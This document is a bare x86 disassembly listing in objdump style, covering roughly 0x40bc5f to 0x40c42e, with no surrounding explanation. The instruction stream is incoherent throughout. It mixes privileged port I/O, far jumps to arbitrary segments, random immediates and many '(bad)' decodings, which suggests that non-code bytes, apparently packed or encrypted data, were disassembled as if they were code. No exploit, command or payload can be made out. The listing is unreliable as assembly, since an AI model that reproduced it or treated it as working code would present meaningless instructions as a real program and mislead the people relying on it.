  40bc5f:	rcr    edx,cl
  40bc61:	int    0x46
  40bc63:	push   es
  40bc64:	call   0x8c6a:0xd32371ef
  40bc6b:	out    0x4c,eax
  40bc6d:	inc    ebx
  40bc6e:	mov    eax,ds:0x4283612d
  40bc73:	push   eax
  40bc74:	pop    ecx
  40bc75:	retf   0xa98d
  40bc78:	pop    ebx
  40bc79:	ror    BYTE PTR [eax+0x7f629417],cl
  40bc7f:	mul    al
  40bc81:	mov    al,ds:0x1ba38894
  40bc86:	push   eax
  40bc87:	pop    edx
  40bc88:	cwde   
  40bc89:	jecxz  0x40bcab
  40bc8b:	add    ch,dh
  40bc8d:	mov    esi,0x92d985f9
  40bc92:	sub    eax,0x8c72be7a
  40bc97:	xchg   ebx,eax
  40bc98:	inc    edi
  40bc99:	inc    esi
  40bc9a:	inc    esp
  40bc9b:	clc    
  40bc9c:	dec    ebp
  40bc9d:	rol    DWORD PTR [edi-0xe0d8a35],0x3a
  40bca4:	and    eax,0x85fdbbfc
  40bca9:	push   0xa98e70ed
  40bcae:	arpl   dx,dx
  40bcb0:	aad    0x56
  40bcb2:	mov    eax,0xddb4423
  40bcb7:	cwde   
  40bcb8:	or     eax,0x985b8f5
  40bcbd:	cmc    
  40bcbe:	jmp    DWORD PTR [esi-0x6e]
  40bcc1:	sbb    BYTE PTR [eax-0x8b3ff77],dl
  40bcc7:	xchg   DWORD PTR [edx],ecx
  40bcc9:	mov    al,ds:0xcd9c6b9
  40bcce:	jne    0x40bc8d
  40bcd0:	mov    edx,0x1ca8a07d
  40bcd5:	sti    
  40bcd6:	arpl   WORD PTR [ecx-0x77],sp
  40bcd9:	sub    ah,0x56
  40bcdc:	push   ss
  40bcdd:	pop    esp
  40bcde:	rcr    BYTE PTR [ebp+0x270ebbb8],1
  40bce4:	rcl    BYTE PTR [edx-0x1a],1
  40bce7:	xchg   ebx,eax
  40bce8:	inc    esp
  40bce9:	mov    edx,0xa931c175
  40bcee:	sbb    ah,dh
  40bcf0:	push   ebp
  40bcf1:	and    eax,0x8429f707
  40bcf6:	cmp    DWORD PTR [eax-0x5cf8611a],ebp
  40bcfc:	xor    al,BYTE PTR [ebp-0x28ed4a88]
  40bd02:	mov    ebp,0x52241e71
  40bd07:	mov    fs,ebp
  40bd09:	or     DWORD PTR [eax],0xab08e99e
  40bd0f:	cmc    
  40bd10:	push   edi
  40bd11:	cmp    bl,0xd5
  40bd14:	mov    bh,0xae
  40bd16:	mov    esp,0x67d321ca
  40bd1b:	jae    0x40bd1e
  40bd1d:	ins    BYTE PTR es:[edi],dx
  40bd1e:	inc    esp
  40bd1f:	xor    al,0x43
  40bd21:	add    DWORD PTR [eax-0x23133bf5],ebx
  40bd27:	or     al,0xdf
  40bd29:	inc    esi
  40bd2a:	fstp   QWORD PTR [esi]
  40bd2c:	ins    BYTE PTR es:[edi],dx
  40bd2d:	cs ret 
  40bd2f:	push   eax
  40bd30:	iret   
  40bd31:	mov    al,0xc4
  40bd33:	mov    ebp,0x70ca5b2b
  40bd38:	pop    ebp
  40bd39:	inc    ecx
  40bd3a:	push   esp
  40bd3b:	jb     0x40bd3c
  40bd3d:	pcmpgtb mm2,QWORD PTR ds:0x18c6dae0
  40bd44:	jbe    0x40bd65
  40bd46:	ja     0x40bda8
  40bd48:	jge    0x40bd06
  40bd4a:	mov    ch,0xe
  40bd4c:	mov    ecx,0x41a3766f
  40bd51:	mov    eax,ds:0x56543fe3
  40bd56:	arpl   cx,di
  40bd58:	and    ah,BYTE PTR [edi]
  40bd5a:	push   fs
  40bd5c:	out    0x94,eax
  40bd5e:	arpl   WORD PTR ds:0x4b0fea5e,ax
  40bd64:	in     al,dx
  40bd65:	lahf   
  40bd66:	daa    
  40bd67:	add    ch,BYTE PTR [edi+0x9]
  40bd6a:	sub    dl,BYTE PTR [edi+0x41]
  40bd6d:	sub    eax,0xc2869e7e
  40bd72:	sbb    al,0x70
  40bd74:	data16 or dh,bl
  40bd77:	fwait
  40bd78:	sbb    al,0x49
  40bd7a:	sub    eax,0xf5ace4bc
  40bd7f:	iret   
  40bd80:	in     eax,dx
  40bd81:	mov    DWORD PTR ds:0xcb323127,esi
  40bd87:	mov    ebp,0xffb6f429
  40bd8c:	es mov al,0xff
  40bd8f:	mov    ds:0xf897246a,al
  40bd94:	lock rcl BYTE PTR [esi-0x406b4de0],1
  40bd9b:	lea    eax,[esi+0x193f6c02]
  40bda1:	dec    edx
  40bda2:	xchg   ecx,eax
  40bda3:	jge    0x40bdb3
  40bda5:	imul   esp,edi,0x78b0854d
  40bdab:	nop
  40bdac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdad:	sbb    al,0x6e
  40bdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb0:	xchg   esp,eax
  40bdb1:	push   esi
  40bdb2:	jbe    0x40be2d
  40bdb4:	adc    eax,0xefe415fa
  40bdb9:	push   ebp
  40bdba:	ficomp DWORD PTR [ebx+0xb]
  40bdbd:	iret   
  40bdbe:	stos   BYTE PTR es:[edi],al
  40bdbf:	call   0x7a48:0xa323f81a
  40bdc6:	dec    ebx
  40bdc7:	adc    eax,0x8b2b0dc4
  40bdcc:	push   edi
  40bdcd:	sub    BYTE PTR ds:0x33c49850,al
  40bdd3:	cmp    bh,BYTE PTR [ecx]
  40bdd5:	cs xor eax,0x5dc4d9de
  40bddb:	push   0xe53ec5ef
  40bde0:	pop    ss
  40bde1:	mov    eax,ds:0xd04a67fe
  40bde7:	jecxz  0x40be36
  40bde9:	(bad)
  40bdec:	sub    DWORD PTR [edi+ecx*8-0x677ed5f1],edx
  40bdf3:	out    0x3f,eax
  40bdf5:	jnp    0x40be33
  40bdf7:	ss stos DWORD PTR es:[edi],eax
  40bdf9:	sub    esi,ebx
  40bdfb:	aam    0xdc
  40bdfd:	sbb    edi,esp
  40bdff:	mov    ecx,0x44cc7648
  40be04:	inc    edi
  40be05:	sbb    eax,0xe64644c8
  40be0a:	mov    ds:0x9301ddb6,al
  40be0f:	sub    BYTE PTR [ebx-0xd],dh
  40be12:	test   ebp,ebp
  40be14:	xor    DWORD PTR [ebp+0x5b],esi
  40be17:	xor    ebp,DWORD PTR [esi-0x6f]
  40be1a:	adc    ebp,DWORD PTR [esi]
  40be1c:	leave  
  40be1d:	jne    0x40bde9
  40be1f:	add    eax,0xe52a15f0
  40be24:	jne    0x40be8f
  40be26:	sub    eax,DWORD PTR [edx+0x4d084d59]
  40be2c:	sbb    eax,0x4b26f41
  40be31:	pop    es
  40be32:	jle    0x2be1fed9
  40be38:	iret   
  40be39:	push   eax
  40be3a:	adc    ch,cl
  40be3c:	imul   ebx,DWORD PTR [edx],0xffffffb0
  40be3f:	cs jg  0x40be4c
  40be42:	(bad)  
  40be44:	jbe    0x40be7e
  40be46:	xor    eax,0x68621520
  40be4b:	cmp    ebx,DWORD PTR [ecx]
  40be4d:	ret    
  40be4e:	mov    ecx,0x59b7f1a
  40be53:	aaa    
  40be54:	cwde   
  40be55:	xchg   ebp,eax
  40be56:	retf   0x84c7
  40be59:	retf   0x8e4c
  40be5c:	jp     0x40bea1
  40be5e:	lods   eax,DWORD PTR ds:[esi]
  40be5f:	ret    
  40be60:	daa    
  40be61:	and    dh,BYTE PTR [ebx+0x243b0123]
  40be67:	jmp    0xb707:0x29b869c6
  40be6e:	out    0xdc,eax
  40be70:	inc    edx
  40be71:	mov    al,ds:0x5fbea94d
  40be76:	lahf   
  40be77:	cli    
  40be78:	push   edx
  40be79:	out    0x2e,al
  40be7b:	jl     0x40be04
  40be7d:	xchg   DWORD PTR [edi+0x4edf91ca],ebx
  40be83:	add    bl,BYTE PTR [eax]
  40be85:	in     eax,0x66
  40be87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be88:	cli    
  40be89:	mov    edi,0xd00d1535
  40be8e:	pop    es
  40be8f:	pushf  
  40be90:	nop
  40be91:	aam    0xbb
  40be93:	ficomp WORD PTR [edi+0x28c1b2c0]
  40be99:	fcompp 
  40be9b:	in     al,0xc1
  40be9d:	cmp    eax,0x52ec5ca1
  40bea2:	ret    0x62cf
  40bea5:	mov    ecx,0xc2a3a943
  40beaa:	push   ds
  40beab:	mov    ebx,0x3e9f19b8
  40beb0:	fsubr  DWORD PTR [edi]
  40beb2:	out    0x27,eax
  40beb4:	push   ds
  40beb5:	or     al,0x4e
  40beb7:	or     cl,BYTE PTR [ebp-0x6]
  40beba:	stos   BYTE PTR es:[edi],al
  40bebb:	push   edi
  40bebc:	mov    ecx,0x142d5704
  40bec1:	loope  0x40bf2a
  40bec3:	xor    ebp,DWORD PTR [ebx]
  40bec5:	and    ebp,ebx
  40bec7:	mov    ch,0xe0
  40bec9:	out    0x2e,al
  40becb:	addr16 push ebp
  40becd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bece:	push   0x2
  40bed0:	ret    0xb3a5
  40bed3:	outs   dx,BYTE PTR ds:[esi]
  40bed4:	fstp   DWORD PTR [ebp-0x44]
  40bed7:	adc    DWORD PTR [esi+0x7d],ebp
  40beda:	addr16 dec esi
  40bedc:	sbb    eax,0x8a770f3a
  40bee1:	xchg   ebp,eax
  40bee2:	mov    ebx,0x560e5d7d
  40bee7:	sub    dh,BYTE PTR [ebx-0x47b367b8]
  40beed:	fdiv   QWORD PTR [eax]
  40beef:	aaa    
  40bef0:	inc    edi
  40bef1:	rcr    DWORD PTR [ebp-0x6a7cfdd0],0xb2
  40bef8:	sbb    esi,DWORD PTR [eax-0x62]
  40befb:	sub    dh,0x7b
  40befe:	sub    ebx,DWORD PTR [esp+eiz*2-0x25f61edf]
  40bf05:	(bad)  
  40bf06:	icebp  
  40bf07:	(bad)  [ecx]
  40bf09:	daa    
  40bf0a:	shr    DWORD PTR [edi+0x5b],cl
  40bf0d:	fistp  QWORD PTR [eax+0x2535c168]
  40bf13:	(bad)
  40bf16:	aaa    
  40bf17:	xchg   BYTE PTR [ecx],bh
  40bf19:	push   0xffffff80
  40bf1b:	pop    edx
  40bf1c:	aam    0xc0
  40bf1e:	sbb    al,0x55
  40bf20:	pop    ss
  40bf21:	mov    al,0x38
  40bf23:	daa    
  40bf24:	mov    edi,cs
  40bf26:	push   ebp
  40bf27:	addr16 leave 
  40bf29:	bound  ebp,QWORD PTR [eax]
  40bf2b:	dec    ebp
  40bf2c:	dec    esi
  40bf2d:	addr16 clc 
  40bf2f:	xor    eax,0x7b00516e
  40bf34:	jno    0x40bece
  40bf36:	mov    ebx,ecx
  40bf38:	pop    esp
  40bf39:	call   0x359ce57e
  40bf3e:	xor    eax,0x28f924b7
  40bf43:	fcomp  DWORD PTR [edi+0x3b06acb8]
  40bf49:	pop    esi
  40bf4a:	call   0x3ea5b112
  40bf4f:	bnd jmp 0x40bfbc
  40bf52:	jno    0x40bf08
  40bf54:	jge    0x40bf5a
  40bf56:	in     eax,dx
  40bf57:	xchg   ecx,eax
  40bf58:	jo     0x40bf94
  40bf5a:	and    DWORD PTR [esi+eiz*1+0x3db9fd05],esp
  40bf61:	xchg   ebx,eax
  40bf62:	in     al,dx
  40bf63:	jle    0x40bfd4
  40bf65:	xor    BYTE PTR [eax+0x7b640856],bl
  40bf6b:	pop    ss
  40bf6c:	xor    DWORD PTR [ebx+0x46fce22b],ebx
  40bf72:	pop    esp
  40bf73:	stc    
  40bf74:	cli    
  40bf75:	in     al,0x36
  40bf77:	add    ch,dl
  40bf79:	xchg   ebx,eax
  40bf7a:	xchg   edi,eax
  40bf7b:	lods   al,BYTE PTR ds:[esi]
  40bf7c:	push   0xffffff95
  40bf7e:	test   al,0x87
  40bf80:	xchg   bh,dh
  40bf82:	push   esp
  40bf83:	add    dh,BYTE PTR [ebx+0xb]
  40bf86:	popf   
  40bf87:	fadd   QWORD PTR [edi]
  40bf89:	cli    
  40bf8a:	inc    DWORD PTR [ecx-0x3fc9df22]
  40bf90:	dec    ecx
  40bf91:	jbe    0x40bf6d
  40bf93:	test   eax,0xaebcbc3e
  40bf98:	or     al,0xeb
  40bf9a:	add    ecx,DWORD PTR [esi+0x1e]
  40bf9d:	(bad)
  40bfa0:	popa   
  40bfa1:	xchg   DWORD PTR [ecx],edx
  40bfa3:	scas   eax,DWORD PTR es:[edi]
  40bfa4:	sub    eax,0x2a7c113
  40bfa9:	fcom   DWORD PTR [eax+ebx*1-0x3b]
  40bfad:	and    eax,0xa4be040a
  40bfb2:	cld    
  40bfb3:	arpl   WORD PTR ds:0xd8f8e636,di
  40bfb9:	(bad)  
  40bfba:	sub    ecx,DWORD PTR [eax-0x466e6e27]
  40bfc0:	test   al,0xcd
  40bfc2:	inc    ebp
  40bfc3:	loop   0x40bf7b
  40bfc5:	clc    
  40bfc6:	dec    ebp
  40bfc7:	and    DWORD PTR [ecx],ecx
  40bfc9:	and    bl,dl
  40bfcb:	jo     0x40bf65
  40bfcd:	mov    BYTE PTR [edx-0x75b77ff6],0xa7
  40bfd4:	xlat   BYTE PTR ds:[ebx]
  40bfd5:	out    0x1c,al
  40bfd7:	sahf   
  40bfd8:	nop
  40bfd9:	adc    al,0xe7
  40bfdb:	ins    DWORD PTR es:[edi],dx
  40bfdc:	dec    edx
  40bfdd:	inc    eax
  40bfde:	aaa    
  40bfdf:	jl     0x40bf9a
  40bfe1:	adc    al,0x59
  40bfe3:	dec    edi
  40bfe4:	les    edx,FWORD PTR [eax]
  40bfe6:	pop    edi
  40bfe7:	add    DWORD PTR [edi+esi*4-0x1c],esp
  40bfeb:	retf   0xc4e3
  40bfee:	dec    eax
  40bfef:	dec    esp
  40bff0:	out    0xfa,al
  40bff2:	loopne 0x40bfbd
  40bff4:	fcomp  DWORD PTR [edi-0x33]
  40bff7:	aam    0x9c
  40bff9:	ficom  DWORD PTR [edi]
  40bffc:	inc    ecx
  40bffd:	sahf   
  40bffe:	in     eax,0x40
  40c000:	loop   0x40bfee
  40c002:	mov    ch,0xe9
  40c004:	push   0x39
  40c006:	je     0x40c00d
  40c008:	mov    es,eax
  40c00a:	cmp    eax,0x1f1b303a
  40c00f:	loop   0x40c04e
  40c011:	(bad)  
  40c012:	imul   esi,DWORD PTR [eax+0x79],0x5e
  40c016:	pop    DWORD PTR [ecx+0x1e74008d]
  40c01c:	add    al,0x15
  40c01e:	add    BYTE PTR [ebx],dl
  40c020:	ja     0x40bfea
  40c022:	add    esi,DWORD PTR [eax-0x29]
  40c025:	lods   al,BYTE PTR ds:[esi]
  40c026:	mov    esi,0x7d6a459e
  40c02b:	fsubr  QWORD PTR [esi+0x32af5e8c]
  40c031:	sbb    edi,DWORD PTR [edi]
  40c033:	push   edx
  40c034:	iret   
  40c035:	repz cld 
  40c037:	mov    edx,ebx
  40c039:	enter  0x1bc3,0x3d
  40c03d:	inc    ecx
  40c03e:	sub    DWORD PTR [edx+esi*2+0x57],esi
  40c042:	jo     0x40c018
  40c044:	sbb    edi,edx
  40c046:	push   esi
  40c047:	aas    
  40c048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c049:	xchg   ebp,eax
  40c04a:	mov    eax,ds:0xbd9bc6f8
  40c04f:	jb     0x40c093
  40c051:	adc    cl,BYTE PTR [ecx]
  40c053:	inc    esp
  40c054:	push   ds
  40c055:	adc    al,0xca
  40c057:	mov    al,0x20
  40c059:	sub    ebp,DWORD PTR [ebx+0x7f]
  40c05c:	mov    edi,0x906d2c63
  40c061:	jbe    0x40c0aa
  40c063:	and    ecx,DWORD PTR [eax-0x5db817a1]
  40c069:	lods   al,BYTE PTR ds:[esi]
  40c06a:	inc    ecx
  40c06b:	fadd   QWORD PTR [eax+0x56ffbf67]
  40c071:	inc    esi
  40c072:	enter  0x4cdc,0x9a
  40c076:	sar    DWORD PTR [ebp-0x67],cl
  40c079:	push   ecx
  40c07a:	push   ss
  40c07b:	(bad)  
  40c07d:	xchg   BYTE PTR [esi+0x6e326c85],ah
  40c083:	aaa    
  40c084:	sub    eax,0xa2db47cd
  40c089:	inc    esi
  40c08a:	sbb    al,0x7d
  40c08c:	test   eax,0x6306ab03
  40c091:	into   
  40c092:	adc    BYTE PTR [ecx+0x16],0x93
  40c096:	out    0xb3,eax
  40c098:	out    dx,eax
  40c099:	cmp    DWORD PTR ds:0x3cc69ac5,ebx
  40c09f:	hlt    
  40c0a0:	inc    ebp
  40c0a1:	adc    eax,0xc90de832
  40c0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a7:	and    DWORD PTR [esi+0x2c],edx
  40c0aa:	cmp    DWORD PTR [ebp+0x373ffcbc],esp
  40c0b0:	(bad)  
  40c0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0b2:	pop    es
  40c0b3:	nop
  40c0b4:	(bad)  
  40c0b5:	aas    
  40c0b6:	mov    eax,ds:0xcf804b3f
  40c0bb:	push   edi
  40c0bc:	mov    edi,0x647ea130
  40c0c1:	lea    esi,[edx+0x36708d8e]
  40c0c7:	ja     0x40c0c5
  40c0c9:	inc    edx
  40c0ca:	jne    0x40c136
  40c0cc:	mov    ebp,0x9c1f4f82
  40c0d1:	sbb    dl,BYTE PTR [edi]
  40c0d3:	adc    dl,BYTE PTR [eax+0x194ff5b9]
  40c0d9:	in     eax,0x9e
  40c0db:	int    0x70
  40c0dd:	xchg   edi,eax
  40c0de:	in     eax,dx
  40c0df:	fstp   TBYTE PTR [ecx-0x1d198f07]
  40c0e5:	mov    dh,0x95
  40c0e7:	pop    ebx
  40c0e8:	xchg   ebx,eax
  40c0e9:	rcl    edi,1
  40c0eb:	cmp    DWORD PTR ds:0x6f7a5885,ecx
  40c0f1:	ds (bad) 
  40c0f3:	pop    ss
  40c0f4:	xor    al,0xe1
  40c0f6:	addr16 pop edi
  40c0f8:	in     al,dx
  40c0f9:	ret    
  40c0fa:	mov    DWORD PTR [ecx-0x78989be4],esp
  40c100:	in     al,0x7c
  40c102:	inc    ebx
  40c103:	adc    dh,BYTE PTR ss:[edi]
  40c106:	cmp    cl,BYTE PTR [ecx-0x21461e79]
  40c10c:	xchg   esp,eax
  40c10d:	mov    edi,0x79efa6
  40c112:	push   0xffffffd0
  40c114:	mov    ds:0xe03af2fc,eax
  40c119:	scas   al,BYTE PTR es:[edi]
  40c11a:	cmp    eax,0xa048f8dd
  40c11f:	push   cs
  40c120:	jmp    0x40c0cc
  40c122:	or     ah,ah
  40c124:	add    BYTE PTR [ebx+ebx*4-0x5b872cbe],dl
  40c12b:	mov    dl,0x16
  40c12d:	pop    ebx
  40c12e:	xchg   esp,eax
  40c12f:	xchg   ebp,eax
  40c130:	(bad)  
  40c132:	jmp    0xfd68:0x8ad6700
  40c139:	sbb    DWORD PTR ds:0x24303799,ebx
  40c13f:	jmp    0x4615bd06
  40c144:	outs   dx,BYTE PTR ds:[esi]
  40c145:	mul    bh
  40c147:	rcr    DWORD PTR [edi-0x1f],0x97
  40c14b:	call   0xab24:0xc8adac8a
  40c152:	mov    ecx,0x4a700429
  40c157:	pop    ecx
  40c158:	test   DWORD PTR [ebp-0x478df1eb],esi
  40c15e:	popa   
  40c15f:	push   0x54
  40c161:	mov    es,WORD PTR [edi-0x1b667dc6]
  40c167:	sub    BYTE PTR [ecx+esi*1+0x36768532],ch
  40c16e:	lds    ebp,FWORD PTR [edi+0x6ba6b3f]
  40c174:	out    0xfb,al
  40c176:	dec    ebp
  40c177:	push   ds
  40c178:	sar    ah,0xdc
  40c17b:	ins    BYTE PTR es:[edi],dx
  40c17c:	inc    esp
  40c17d:	jmp    0x9319:0x901229f5
  40c184:	add    eax,0x228537f
  40c189:	lahf   
  40c18a:	jl     0x40c15c
  40c18c:	mov    DWORD PTR [edx+0x45734a78],ecx
  40c192:	lock fnstenv [ecx+ecx*8]
  40c196:	ja     0x40c146
  40c198:	push   esi
  40c199:	xchg   ecx,eax
  40c19a:	cli    
  40c19b:	xor    DWORD PTR [esi],edx
  40c19d:	rcl    al,0xfb
  40c1a0:	and    eax,0x52db44a8
  40c1a5:	mov    edi,0x2a00fccf
  40c1aa:	add    eax,0xc3efc2e6
  40c1af:	dec    esp
  40c1b0:	jmp    0x40c159
  40c1b2:	mov    ebx,0xe909abec
  40c1b8:	addr16 and edi,ebx
  40c1bb:	mov    bx,WORD PTR [esp+eax*1-0x6cee6f3]
  40c1c3:	(bad)  
  40c1c4:	fstp   TBYTE PTR [ebp+0x354d6ba9]
  40c1ca:	pop    esi
  40c1cb:	out    dx,eax
  40c1cc:	aas    
  40c1cd:	fs xchg edi,eax
  40c1cf:	loop   0x40c161
  40c1d1:	jb     0x40c1bc
  40c1d3:	push   0xf1c3b820
  40c1d8:	dec    ebx
  40c1d9:	sahf   
  40c1da:	sbb    BYTE PTR [esi],bl
  40c1dc:	push   ebp
  40c1dd:	mov    bh,BYTE PTR [ebp-0x437c8e9e]
  40c1e3:	out    0x60,eax
  40c1e5:	dec    edi
  40c1e6:	sbb    al,0xab
  40c1e8:	adc    al,0x72
  40c1ea:	in     al,0xe7
  40c1ec:	jns    0x40c192
  40c1ee:	cmp    BYTE PTR [ebx-0x5a],cl
  40c1f1:	xchg   ebx,eax
  40c1f2:	jecxz  0x40c26d
  40c1f4:	mov    eax,ds:0x656c8a37
  40c1f9:	and    al,0xdf
  40c1fb:	push   ecx
  40c1fc:	push   ebx
  40c1fd:	test   BYTE PTR [edi+0x6c52e37b],ah
  40c203:	daa    
  40c204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c205:	shl    al,1
  40c207:	xchg   ecx,eax
  40c208:	aam    0x45
  40c20a:	lods   eax,DWORD PTR ds:[esi]
  40c20b:	repz push es
  40c20d:	lock pop ebp
  40c20f:	mov    edx,es
  40c211:	sti    
  40c212:	add    ebp,0x7b600512
  40c218:	test   BYTE PTR [edi],0x47
  40c21b:	ror    BYTE PTR [edx],cl
  40c21d:	rcl    BYTE PTR [ebp+edx*1+0x120c97dd],0xd0
  40c225:	sbb    al,0xc
  40c227:	jae    0x40c25b
  40c229:	(bad)  
  40c22b:	jg     0x40c20b
  40c22d:	or     BYTE PTR [ebp+0x78],cl
  40c230:	fcompp 
  40c232:	mov    bh,ch
  40c234:	and    DWORD PTR [ecx],ebx
  40c236:	jl     0x40c29e
  40c238:	and    eax,0xe9525e9d
  40c23d:	test   dh,bh
  40c23f:	xchg   edx,eax
  40c240:	popa   
  40c241:	sub    al,0x1f
  40c243:	mov    fs,WORD PTR [ecx-0x75b78f18]
  40c249:	jns    0x40c215
  40c24b:	add    DWORD PTR [edi+0x3976275e],ebx
  40c251:	in     al,dx
  40c252:	stos   DWORD PTR es:[edi],eax
  40c253:	shl    DWORD PTR [ebp-0x2b],0x51
  40c257:	cmp    al,0x3e
  40c259:	adc    eax,eax
  40c25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c25c:	or     cl,0xda
  40c25f:	ja     0x40c21f
  40c261:	sub    eax,0x4768c510
  40c266:	sbb    al,0xbb
  40c268:	adc    al,0x8c
  40c26a:	and    ecx,edx
  40c26c:	icebp  
  40c26d:	imul   DWORD PTR [edx-0x76cdc33d]
  40c273:	or     al,0xf1
  40c275:	pop    ebp
  40c276:	mov    ds:0x9c5b98c3,eax
  40c27b:	sub    eax,DWORD PTR [edi]
  40c27d:	cmp    BYTE PTR [esi*2-0x1320cc72],0x5
  40c285:	lods   al,BYTE PTR ds:[esi]
  40c286:	pop    ds
  40c287:	fisttp DWORD PTR [ebx]
  40c289:	push   esp
  40c28a:	dec    edi
  40c28b:	pushf  
  40c28c:	sub    eax,0xf0a7bcfc
  40c291:	pop    ss
  40c292:	pop    edi
  40c293:	pop    ebx
  40c294:	cmp    eax,0xffffffc6
  40c297:	inc    edx
  40c298:	mov    esp,0x9e1f5f71
  40c29d:	pop    ds
  40c29e:	jno    0x40c2d8
  40c2a0:	or     dl,BYTE PTR [esi+0x3b]
  40c2a3:	pop    edx
  40c2a4:	ficomp DWORD PTR [esi-0x67329c39]
  40c2ab:	mov    al,ds:0x94cf8b44
  40c2b0:	int    0x60
  40c2b2:	and    al,0x92
  40c2b4:	mov    eax,ds:0x7800a874
  40c2b9:	cld    
  40c2ba:	stc    
  40c2bb:	pop    ebp
  40c2bc:	and    eax,DWORD PTR [ebx]
  40c2be:	push   edx
  40c2bf:	add    al,0x73
  40c2c1:	jnp    0x40c339
  40c2c3:	or     DWORD PTR [esi+0x5742ca69],ebp
  40c2c9:	jnp    0x40c2db
  40c2cb:	xchg   ecx,eax
  40c2cc:	retf   0xd972
  40c2cf:	(bad)  
  40c2d0:	cmp    al,0x98
  40c2d2:	jecxz  0x40c2e9
  40c2d4:	adc    edi,0x547d1051
  40c2da:	ss adc eax,0x961fc7a0
  40c2e0:	dec    ecx
  40c2e1:	addr16 shl ebp,cl
  40c2e4:	adc    eax,0x3cc595eb
  40c2e9:	fdivr  DWORD PTR [ebx]
  40c2eb:	sub    DWORD PTR [edi+edi*2+0x14005285],ebp
  40c2f2:	jl     0x40c2ee
  40c2f4:	(bad)  
  40c2f5:	xchg   ebp,eax
  40c2f6:	push   ds
  40c2f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f8:	mov    al,0xea
  40c2fa:	es dec edi
  40c2fc:	push   edx
  40c2fd:	inc    edx
  40c2fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ff:	jp     0x40c2b3
  40c301:	fucom  st(2)
  40c303:	mov    esi,0x90026640
  40c308:	pop    esi
  40c309:	mov    eax,0x9b37c136
  40c30e:	jb     0x40c2a8
  40c310:	sub    eax,0xaf362ba
  40c315:	outs   dx,BYTE PTR ds:[esi]
  40c316:	mov    ecx,0xf2005400
  40c31b:	fwait
  40c31c:	dec    edx
  40c31d:	or     DWORD PTR [ebx+esi*2],esi
  40c320:	lahf   
  40c321:	push   ebx
  40c322:	jno    0x40c34e
  40c324:	cmp    DWORD PTR [ecx+ebp*1+0x76],ecx
  40c328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c329:	or     ebx,edx
  40c32b:	cmp    eax,0x4fc26bf8
  40c330:	popa   
  40c331:	push   0xfffffff3
  40c333:	cmp    dl,BYTE PTR [esi]
  40c335:	sahf   
  40c336:	dec    ecx
  40c337:	pop    eax
  40c338:	jae    0x40c2ed
  40c33a:	aam    0xc0
  40c33c:	or     eax,0x48763226
  40c341:	xor    dh,BYTE PTR [ecx]
  40c343:	push   0x9ab36a79
  40c348:	mov    ebp,0xbf84d61d
  40c34d:	out    0x58,al
  40c34f:	fcomp  DWORD PTR [ecx]
  40c351:	xor    dh,0xda
  40c354:	cmp    DWORD PTR [edi+0x2023606b],edx
  40c35a:	push   ebx
  40c35b:	icebp  
  40c35c:	cdq    
  40c35d:	or     ah,BYTE PTR [eax+0x4f458e5c]
  40c363:	loop   0x40c306
  40c365:	mov    ds:0x62f89472,al
  40c36a:	clc    
  40c36b:	popf   
  40c36c:	mov    dl,0xdc
  40c36e:	cmp    DWORD PTR [ecx-0x196831d3],ebp
  40c374:	and    al,0xf0
  40c376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c377:	fs or  al,0x77
  40c37a:	out    0x16,al
  40c37c:	leave  
  40c37d:	inc    esi
  40c37e:	mov    dl,0x79
  40c380:	mov    eax,ds:0x39a97628
  40c385:	out    0x19,al
  40c387:	mov    edx,ebx
  40c389:	sub    eax,0x1f8859e0
  40c38e:	push   ebx
  40c38f:	(bad)
  40c393:	leave  
  40c394:	xchg   edi,eax
  40c395:	mov    al,0xa8
  40c397:	jmp    0xe52c:0xd65260ae
  40c39e:	add    BYTE PTR [ebx+ebp*8-0x3d],0x4a
  40c3a3:	sub    DWORD PTR [ebp+edx*1+0x3c49fb40],esp
  40c3aa:	stos   DWORD PTR es:[edi],eax
  40c3ab:	(bad)  
  40c3ac:	push   ebx
  40c3ad:	idiv   DWORD PTR [edi+0x6828ee03]
  40c3b3:	push   esi
  40c3b4:	adc    dl,al
  40c3b6:	dec    ebp
  40c3b7:	add    DWORD PTR [ecx+ebx*1],esi
  40c3ba:	adc    ecx,edx
  40c3bc:	cmp    ch,BYTE PTR [edi-0x2f]
  40c3bf:	(bad)  
  40c3c2:	cmp    ebp,esp
  40c3c4:	dec    esp
  40c3c5:	ficomp DWORD PTR [ebx+0x2a28fd2b]
  40c3cb:	hlt    
  40c3cc:	mov    eax,ds:0xf745095e
  40c3d1:	push   esp
  40c3d2:	mov    dh,0x84
  40c3d4:	out    dx,al
  40c3d5:	mov    dl,0x95
  40c3d7:	ss jecxz 0x40c39e
  40c3da:	xor    BYTE PTR [ebp-0xf],dh
  40c3dd:	cdq    
  40c3de:	mov    BYTE PTR [ebx+0x10],dh
  40c3e1:	add    dh,BYTE PTR [ebx+0x8]
  40c3e4:	jmp    0xfab:0xe884caab
  40c3eb:	nop
  40c3ec:	clc    
  40c3ed:	dec    eax
  40c3ee:	mov    al,ds:0xd7dc1e1e
  40c3f3:	fld    TBYTE PTR ds:0xcbe2dbef
  40c3f9:	inc    ebx
  40c3fa:	fild   DWORD PTR [edi+eax*1-0x5f391b61]
  40c401:	pushf  
  40c402:	bound  edx,QWORD PTR [esi+edx*1+0x14]
  40c406:	sub    BYTE PTR ds:0x2a72030,al
  40c40c:	in     eax,dx
  40c40d:	jmp    0xa353:0x2046c989
  40c414:	fabs   
  40c416:	sahf   
  40c417:	jae    0x40c44e
  40c419:	fwait
  40c41a:	clc    
  40c41b:	fwait
  40c41c:	inc    ecx
  40c41d:	fadd   st,st(0)
  40c41f:	inc    ecx
  40c420:	xor    DWORD PTR ds:0xcdae519f,esp
  40c426:	mov    dh,0x18
  40c428:	mov    esi,0xd4618bf9
  40c42d:	xchg   esi,eax
  40c42e:	stc    
